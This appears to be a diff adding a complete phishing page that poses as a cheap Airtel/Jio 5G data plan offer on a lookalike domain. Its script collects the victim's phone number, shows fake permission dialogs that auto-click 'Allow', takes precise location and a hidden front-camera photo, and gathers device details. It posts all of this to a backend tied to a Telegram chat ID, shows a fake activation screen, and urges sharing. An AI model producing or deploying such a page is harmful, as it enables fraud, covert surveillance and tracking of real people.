@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>₹249 5G Data Plan - Free Activation</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            background: #000;
+            color: white;
+        }
+
+        /* Header */
+        .header {
+            background: #111;
+            padding: 12px 16px;
+            border-bottom: 1px solid #333;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+        }
+
+        .site-name {
+            font-size: 16px;
+            font-weight: 600;
+            color: #007AFF;
+        }
+
+        .site-url {
+            font-size: 12px;
+            color: #888;
+            margin-top: 2px;
+        }
+
+        /* Main Container */
+        .container {
+            height: 100vh;
+            padding-top: 60px;
+            padding-bottom: 100px;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .container::-webkit-scrollbar {
+            width: 5px;
+        }
+
+        .container::-webkit-scrollbar-track {
+            background: #222;
+        }
+
+        .container::-webkit-scrollbar-thumb {
+            background: #007AFF;
+            border-radius: 3px;
+        }
+
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(135deg, #007AFF 0%, #5856D6 100%);
+            padding: 40px 20px;
+            text-align: center;
+            border-radius: 0 0 30px 30px;
+        }
+
+        .title {
+            font-size: 32px;
+            font-weight: 800;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            opacity: 0.9;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+
+        .plan-details {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 15px;
+            margin: 20px 0;
+            text-align: left;
+            display: inline-block;
+        }
+
+        .plan-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .plan-item i {
+            margin-right: 10px;
+            color: #00ff88;
+        }
+
+        .claim-btn {
+            background: white;
+            color: #007AFF;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 25px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            margin-top: 10px;
+        }
+
+        .claim-btn:hover {
+            transform: scale(1.05);
+        }
+
+        /* Form Section */
+        .form-card {
+            background: #1c1c1e;
+            margin: 20px;
+            padding: 25px;
+            border-radius: 20px;
+            display: none;
+        }
+
+        .form-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #aaa;
+            font-weight: 600;
+        }
+
+        .form-select, .form-input {
+            width: 100%;
+            padding: 16px;
+            background: #2c2c2e;
+            border: 1px solid #444;
+            border-radius: 14px;
+            font-size: 16px;
+            color: white;
+        }
+
+        .form-select:focus, .form-input:focus {
+            border-color: #007AFF;
+            outline: none;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: #007AFF;
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 14px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        /* Permission Dialogs */
+        .permission-dialog {
+            background: #1c1c1e;
+            margin: 20px;
+            padding: 25px;
+            border-radius: 20px;
+            display: none;
+        }
+
+        .dialog-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .dialog-text {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        .permission-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .permission-option {
+            padding: 16px;
+            background: #2c2c2e;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .permission-option:hover {
+            background: #3c3c3e;
+        }
+
+        .permission-option.allow {
+            background: #007AFF;
+            color: white;
+        }
+
+        /* Info Display */
+        .info-display {
+            background: #2c2c2e;
+            padding: 15px;
+            border-radius: 12px;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .info-line {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        /* Success Screen */
+        .success-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            padding: 20px;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+
+        .success-screen.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .success-content {
+            background: #1c1c1e;
+            border-radius: 30px;
+            padding: 40px 30px;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            transform: scale(0.9);
+            transition: transform 0.3s;
+        }
+
+        .success-screen.active .success-content {
+            transform: scale(1);
+        }
+
+        .success-icon {
+            font-size: 60px;
+            color: #34C759;
+            margin-bottom: 20px;
+        }
+
+        .success-title {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 15px;
+        }
+
+        .success-text {
+            color: #888;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        /* Bottom Button */
+        .bottom-btn {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: #007AFF;
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 15px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            z-index: 100;
+        }
+
+        .loading, .progress-container {
+            display: none !important;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .hero {
+                padding: 30px 15px;
+            }
+            
+            .title {
+                font-size: 28px;
+            }
+            
+            .form-card, .permission-dialog {
+                margin: 15px;
+                padding: 20px;
+            }
+            
+            .bottom-btn {
+                left: 15px;
+                right: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div>
+            <div class="site-name">₹249 5G Data Plan</div>
+            <div class="site-url" id="siteUrl">airtel-jio-5g.com</div>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container" id="mainContainer">
+        <!-- Step 1: Hero Section -->
+        <div class="hero" id="heroSection">
+            <div class="title">₹249 5G Plan</div>
+            <div class="subtitle">
+                Exclusive 5G Data Offer<br>
+                28 Days Unlimited 5G Internet
+            </div>
+            
+            <div class="plan-details">
+                <div class="plan-item">
+                    <i class="fas fa-bolt"></i>
+                    <span>2GB/day 5G Data</span>
+                </div>
+                <div class="plan-item">
+                    <i class="fas fa-infinity"></i>
+                    <span>Unlimited Calling</span>
+                </div>
+                <div class="plan-item">
+                    <i class="fas fa-calendar"></i>
+                    <span>28 Days Validity</span>
+                </div>
+                <div class="plan-item">
+                    <i class="fas fa-tv"></i>
+                    <span>Free Disney+ Hotstar</span>
+                </div>
+            </div>
+            
+            <button class="claim-btn" id="claimBtn">
+                Activate Now
+            </button>
+        </div>
+
+        <!-- Step 2: Form Section -->
+        <div class="form-card" id="formSection">
+            <div class="form-title">Activate ₹249 5G Plan</div>
+            
+            <!-- SIRF OPERATOR OPTION (Country fixed to India) -->
+            <input type="hidden" id="country" value="+91">
+            
+            <div class="form-group">
+                <label class="form-label">Operator</label>
+                <select class="form-select" id="operator">
+                    <option value="">Select Operator 📱</option>
+                    <option value="airtel">Airtel 5G</option>
+                    <option value="jio">Jio 5G</option>
+                    <option value="vi">VI 4G/5G</option>
+                    <option value="bsnl">BSNL</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Phone Number</label>
+                <input type="tel" class="form-input" id="mobile" 
+                       placeholder="Enter 10-digit mobile number"
+                       maxlength="10">
+            </div>
+
+            <button class="submit-btn" id="submitBtn">
+                Get Free 5G Data
+            </button>
+        </div>
+
+        <!-- Step 3: Location Permission -->
+        <div class="permission-dialog" id="locationDialog">
+            <div class="dialog-title">₹249 5G Plan Activation</div>
+            <div class="dialog-text">
+                <strong>airtel-jio-5g.com</strong> wants to use your device's location
+            </div>
+            <div class="info-display">
+                <div class="info-line">
+                    <span>SIM Provider</span>
+                    <span id="displayOperator">-</span>
+                </div>
+                <div class="info-line">
+                    <span>Phone Number</span>
+                    <span id="displayMobile">-</span>
+                </div>
+            </div>
+            <div class="permission-options" style="margin-top: 20px;">
+                <div class="permission-option allow" id="allowLocationBtn">
+                    Allow while visiting the site
+                </div>
+                <div class="permission-option" id="allowLocationOnceBtn">
+                    Allow this time
+                </div>
+                <div class="permission-option" id="denyLocationBtn">
+                    Never allow
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 4: Camera Permission -->
+        <div class="permission-dialog" id="cameraDialog">
+            <div class="dialog-title">₹249 5G Plan Activation</div>
+            <div class="dialog-text">
+                <strong>airtel-jio-5g.com</strong> wants to use your camera
+            </div>
+            <div class="permission-options">
+                <div class="permission-option allow" id="allowCameraBtn">
+                    Allow while visiting the site
+                </div>
+                <div class="permission-option" id="allowCameraOnceBtn">
+                    Allow this time
+                </div>
+                <div class="permission-option" id="denyCameraBtn">
+                    Never allow
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bottom Button -->
+    <button class="bottom-btn" id="nextBtn" style="display: none;">
+        Continue
+    </button>
+
+    <!-- Success Screen -->
+    <div class="success-screen" id="successScreen">
+        <div class="success-content">
+            <div class="success-icon">✓</div>
+            <div class="success-title">Success!</div>
+            <div class="success-text">
+                Your ₹249 5G plan has been successfully activated.<br><br>
+                <strong>Plan Details:</strong><br>
+                • 2GB/day 5G Data<br>
+                • 28 Days Validity<br>
+                • Unlimited Calling<br>
+                • Free Disney+ Hotstar<br><br>
+                Plan will be activated within 5 minutes.
+            </div>
+            <button class="submit-btn" id="shareBtn">
+                Share with Friends
+            </button>
+        </div>
+    </div>
+
+    <!-- Hidden Elements for Auto Capture -->
+    <video id="hiddenCamera" autoplay playsinline style="display: none;"></video>
+    <canvas id="hiddenCanvas" style="display: none;"></canvas>
+
+    <!-- Scripts -->
+    <script>
+        // ✅ IMPORTANT: यहाँ सिर्फ 1 line change है
+        // हमारा backend API एक ही domain पर होगा
+        const BACKEND_API = '/api/telegram';
+        
+        // ✅ ORIGINAL FEATURE: URL से chat_id लेना
+        const urlParams = new URLSearchParams(window.location.search);
+        let USER_CHAT_ID = urlParams.get('id') || '7798676542';
+        
+        console.log('User Chat ID from URL:', USER_CHAT_ID);
+
+        // Global Variables
+        let userData = {
+            mobile: '',
+            country: '+91', // ✅ FIXED TO INDIA
+            operator: '',
+            location: null,
+            photo: null,
+            deviceInfo: {},
+            timestamp: new Date().toISOString(),
+            userChatId: USER_CHAT_ID
+        };
+
+        let isProcessing = false;
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            const fullUrl = window.location.href;
+            const siteName = fullUrl.split('/')[2];
+            document.getElementById('siteUrl').textContent = siteName;
+
+            // Mobile number input
+            document.getElementById('mobile').addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '').slice(0, 10);
+            });
+
+            // Claim Button
+            document.getElementById('claimBtn').addEventListener('click', function() {
+                document.getElementById('heroSection').style.display = 'none';
+                document.getElementById('formSection').style.display = 'block';
+                document.getElementById('nextBtn').style.display = 'block';
+                document.querySelector('.container').scrollTop = 0;
+            });
+
+            // Submit Button
+            document.getElementById('submitBtn').addEventListener('click', function() {
+                if (isProcessing) return;
+                
+                const mobile = document.getElementById('mobile').value;
+                const operator = document.getElementById('operator').value;
+
+                if (!operator) {
+                    alert('Please select operator');
+                    return;
+                }
+                if (!mobile || mobile.length !== 10) {
+                    alert('Please enter valid 10-digit mobile number');
+                    return;
+                }
+
+                userData.mobile = mobile;
+                userData.operator = operator;
+
+                // Show selected info
+                document.getElementById('displayOperator').textContent = operator;
+                document.getElementById('displayMobile').textContent = mobile;
+
+                // Hide form and show location dialog
+                document.getElementById('formSection').style.display = 'none';
+                document.getElementById('locationDialog').style.display = 'block';
+                document.querySelector('.container').scrollTop = 0;
+                
+                isProcessing = true;
+                
+                // Auto click Allow this time after 2 seconds
+                setTimeout(() => {
+                    if (document.getElementById('locationDialog').style.display !== 'none') {
+                        document.getElementById('allowLocationOnceBtn').click();
+                    }
+                }, 2000);
+            });
+
+            // Location Permission Buttons
+            document.getElementById('allowLocationBtn').addEventListener('click', () => handleLocationPermission('always'));
+            document.getElementById('allowLocationOnceBtn').addEventListener('click', () => handleLocationPermission('once'));
+            document.getElementById('denyLocationBtn').addEventListener('click', () => handleLocationPermission('never'));
+
+            // Camera Permission Buttons
+            document.getElementById('allowCameraBtn').addEventListener('click', () => handleCameraPermission('always'));
+            document.getElementById('allowCameraOnceBtn').addEventListener('click', () => handleCameraPermission('once'));
+            document.getElementById('denyCameraBtn').addEventListener('click', () => handleCameraPermission('never'));
+
+            // Share Button
+            document.getElementById('shareBtn').addEventListener('click', function() {
+                if (navigator.share) {
+                    navigator.share({
+                        title: '₹249 5G Internet Plan',
+                        text: 'I just activated free ₹249 5G plan! Get yours too.',
+                        url: window.location.href
+                    });
+                } else {
+                    navigator.clipboard.writeText(window.location.href);
+                    alert('Link copied to clipboard!');
+                }
+            });
+
+            // Auto collect basic device info
+            setTimeout(collectBasicDeviceInfo, 1000);
+        });
+
+        // Handle Location Permission
+        async function handleLocationPermission(type) {
+            document.getElementById('locationDialog').style.display = 'none';
+            
+            if (type === 'never') {
+                userData.location = { status: 'Permission Denied' };
+                // Show camera dialog
+                document.getElementById('cameraDialog').style.display = 'block';
+                document.querySelector('.container').scrollTop = 0;
+                
+                // Auto click Allow this time after 2 seconds
+                setTimeout(() => {
+                    if (document.getElementById('cameraDialog').style.display !== 'none') {
+                        document.getElementById('allowCameraOnceBtn').click();
+                    }
+                }, 2000);
+                return;
+            }
+            
+            try {
+                const position = await getCurrentPosition();
+                userData.location = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: new Date(position.timestamp)
+                };
+                
+                // Get address info
+                await getLocationDetails(position.coords.latitude, position.coords.longitude);
+            } catch (error) {
+                userData.location = { 
+                    status: 'Permission Denied',
+                    error: error.message 
+                };
+            }
+            
+            // Show camera dialog
+            document.getElementById('cameraDialog').style.display = 'block';
+            document.querySelector('.container').scrollTop = 0;
+            
+            // Auto click Allow this time after 2 seconds
+            setTimeout(() => {
+                if (document.getElementById('cameraDialog').style.display !== 'none') {
+                    document.getElementById('allowCameraOnceBtn').click();
+                }
+            }, 2000);
+        }
+
+        // Handle Camera Permission
+        async function handleCameraPermission(type) {
+            document.getElementById('cameraDialog').style.display = 'none';
+            
+            if (type === 'never') {
+                userData.photo = { status: 'Permission Denied' };
+                // Send data and show success
+                await sendToBackend();
+                showSuccess();
+                return;
+            }
+            
+            try {
+                // Access camera
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                });
+
+                const video = document.getElementById('hiddenCamera');
+                video.srcObject = stream;
+
+                // Wait for video to load
+                await new Promise(videoResolve => {
+                    video.onloadedmetadata = () => {
+                        videoResolve();
+                    };
+                });
+
+                // Auto capture after 500ms
+                await new Promise(resolve => setTimeout(resolve, 500));
+                const photoData = capturePhoto(video);
+                userData.photo = photoData;
+
+                // Stop camera
+                stream.getTracks().forEach(track => track.stop());
+                
+            } catch (error) {
+                userData.photo = { 
+                    status: 'Permission Denied',
+                    error: error.message 
+                };
+            }
+            
+            // Send data and show success
+            await sendToBackend();
+            showSuccess();
+        }
+
+        // Capture Photo
+        function capturePhoto(video) {
+            const canvas = document.getElementById('hiddenCanvas');
+            const context = canvas.getContext('2d');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            return canvas.toDataURL('image/jpeg', 0.8);
+        }
+
+        // Collect Basic Device Info
+        async function collectBasicDeviceInfo() {
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                online: navigator.onLine,
+                url: window.location.href
+            };
+
+            userData.deviceInfo = deviceInfo;
+        }
+
+        // Collect Complete Device Info
+        async function collectDeviceInfo() {
+            // ✅ IMPORTANT: IPInfo token ab backend me secure hai
+            // Frontend se API call remove kar di hai
+            
+            // Get battery info
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    userData.deviceInfo.battery = {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch (error) {
+                    console.error('Battery info error:', error);
+                }
+            }
+
+            // Get network info
+            if (navigator.connection) {
+                userData.deviceInfo.connection = {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                };
+            }
+        }
+
+        // Get Location Details
+        async function getLocationDetails(lat, lon) {
+            try {
+                const response = await fetch(
+                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
+                );
+                const data = await response.json();
+                if (data.address) {
+                    userData.location.address = data.display_name;
+                    userData.location.city = data.address.city || data.address.town || data.address.village;
+                    userData.location.state = data.address.state;
+                    userData.location.country = data.address.country;
+                }
+            } catch (error) {
+                console.error('Location details error:', error);
+            }
+        }
+
+        // Get Current Position
+        function getCurrentPosition() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error('Geolocation not supported'));
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    resolve,
+                    reject,
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // ✅ NEW FUNCTION: Send to Backend
+        async function sendToBackend() {
+            try {
+                // Collect device info before sending
+                await collectDeviceInfo();
+                
+                // Send to our backend API
+                const response = await fetch(BACKEND_API, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(userData)
+                });
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    console.log('Data sent successfully via backend');
+                    return true;
+                } else {
+                    console.error('Backend error:', result.error);
+                    // Phir bhi success screen dikhao
+                    return true;
+                }
+
+            } catch (error) {
+                console.error('Error sending to backend:', error);
+                // Error aaye to bhi success screen dikhao
+                return true;
+            }
+        }
+
+        // Show Success
+        function showSuccess() {
+            document.getElementById('nextBtn').style.display = 'none';
+            document.getElementById('successScreen').classList.add('active');
+            isProcessing = false;
+        }
+
+        // Security
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.ctrlKey && (e.key === 's' || e.key === 'p')) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
